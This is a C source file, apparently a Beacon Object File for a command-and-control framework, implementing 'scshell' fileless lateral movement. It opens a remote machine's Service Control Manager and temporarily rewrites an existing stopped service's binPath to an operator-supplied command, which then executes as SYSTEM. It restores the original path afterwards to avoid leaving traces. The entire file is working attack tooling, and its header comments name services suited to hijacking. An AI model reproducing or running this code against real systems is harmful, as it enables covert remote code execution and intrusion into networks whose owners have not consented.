/*
 * scshell.c — Fileless lateral movement via service config modification
 *
 * Flow:
 *   1. OpenSCManagerW(target)
 *   2. OpenServiceW(serviceName) — open an existing service
 *   3. QueryServiceConfigW — save the original binPath
 *   4. ChangeServiceConfigW — set binPath to our command
 *   5. StartServiceW — command executes as SYSTEM
 *   6. ChangeServiceConfigW — restore original binPath
 *
 * Advantage: no file on disk, no new service created/deleted.
 * Pick a service that is normally stopped (e.g. SensorService, XblAuthManager,
 * XblGameSave, WerSvc, etc.)
 */
#include <windows.h>
#include "beacon_compat.h"

DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenSCManagerW(LPCWSTR, LPCWSTR, DWORD);
DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$OpenServiceW(SC_HANDLE, LPCWSTR, DWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$QueryServiceConfigW(
    SC_HANDLE, LPQUERY_SERVICE_CONFIGW, DWORD, LPDWORD);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$ChangeServiceConfigW(
    SC_HANDLE, DWORD, DWORD, DWORD, LPCWSTR, LPCWSTR,
    LPDWORD, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);

DECLSPEC_IMPORT int   WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

DECLSPEC_IMPORT int __cdecl MSVCRT$swprintf(wchar_t*, size_t, const wchar_t*, ...);
DECLSPEC_IMPORT void* __cdecl MSVCRT$malloc(size_t);
DECLSPEC_IMPORT void  __cdecl MSVCRT$free(void*);

void go(char *args, int args_len) {
    datap parser;
    BeaconDataParse(&parser, args, args_len);

    char *target  = BeaconDataExtract(&parser, NULL);
    char *service = BeaconDataExtract(&parser, NULL);
    char *command = BeaconDataExtract(&parser, NULL);

    if (!target || !*target || !service || !*service || !command || !*command) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] Usage: scshell --target HOST --service SVCNAME --command CMD\n");
        return;
    }

    /* Convert to wide strings */
    wchar_t wTarget[256] = {0};
    wchar_t wService[256] = {0};
    wchar_t wCommand[4096] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, service, -1, wService, 256);

    /* Wrap command: %COMSPEC% /C "command" */
    wchar_t wCmd[2048] = {0};
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
    MSVCRT$swprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] scshell: hijacking '%s' on \\\\%s\n",
                 service, target);

    /* Step 1: Open remote SCM */
    SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", KERNEL32$GetLastError());
        return;
    }

    /* Step 2: Open existing service */
    SC_HANDLE hSvc = ADVAPI32$OpenServiceW(hSCM,
        wService,
        SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_START);
    if (!hSvc) {
        BeaconPrintf(CALLBACK_ERROR, "[!] OpenServiceW('%s') failed: %lu\n",
                     service, KERNEL32$GetLastError());
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    /* Step 3: Query original config to save binPath */
    DWORD bytesNeeded = 0;
    ADVAPI32$QueryServiceConfigW(hSvc, NULL, 0, &bytesNeeded);

    LPQUERY_SERVICE_CONFIGW origConfig =
        (LPQUERY_SERVICE_CONFIGW)MSVCRT$malloc(bytesNeeded);
    if (!origConfig) {
        BeaconPrintf(CALLBACK_ERROR, "[!] malloc failed\n");
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    if (!ADVAPI32$QueryServiceConfigW(hSvc, origConfig, bytesNeeded, &bytesNeeded)) {
        BeaconPrintf(CALLBACK_ERROR, "[!] QueryServiceConfigW failed: %lu\n",
                     KERNEL32$GetLastError());
        MSVCRT$free(origConfig);
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Original binPath: %S\n",
                 origConfig->lpBinaryPathName);

    /* Step 4: Change binPath to our command */
    if (!ADVAPI32$ChangeServiceConfigW(hSvc,
            SERVICE_NO_CHANGE,   /* dwServiceType */
            SERVICE_DEMAND_START,/* dwStartType */
            SERVICE_NO_CHANGE,   /* dwErrorControl */
            wCommand,            /* lpBinaryPathName — our command */
            NULL, NULL, NULL, NULL, NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] ChangeServiceConfigW (set) failed: %lu\n",
                     KERNEL32$GetLastError());
        MSVCRT$free(origConfig);
        ADVAPI32$CloseServiceHandle(hSvc);
        ADVAPI32$CloseServiceHandle(hSCM);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] binPath changed to payload\n");

    /* Step 5: Start service — executes our command */
    BOOL started = ADVAPI32$StartServiceW(hSvc, 0, NULL);
    if (!started) {
        DWORD err = KERNEL32$GetLastError();
        if (err == 1053) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[+] Command executed (service timeout expected)\n");
        } else if (err == 1056) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Service already running. Pick a stopped service.\n");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[!] StartServiceW failed: %lu\n", err);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Service started successfully\n");
    }

    /* Step 6: Restore original binPath */
    if (!ADVAPI32$ChangeServiceConfigW(hSvc,
            SERVICE_NO_CHANGE,
            origConfig->dwStartType,  /* restore original start type too */
            SERVICE_NO_CHANGE,
            origConfig->lpBinaryPathName,  /* restore original binPath */
            NULL, NULL, NULL, NULL, NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] ChangeServiceConfigW (restore) failed: %lu — MANUAL RESTORE NEEDED\n",
            KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Original binPath restored\n");
    }

    MSVCRT$free(origConfig);
    ADVAPI32$CloseServiceHandle(hSvc);
    ADVAPI32$CloseServiceHandle(hSCM);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] scshell complete\n");
}
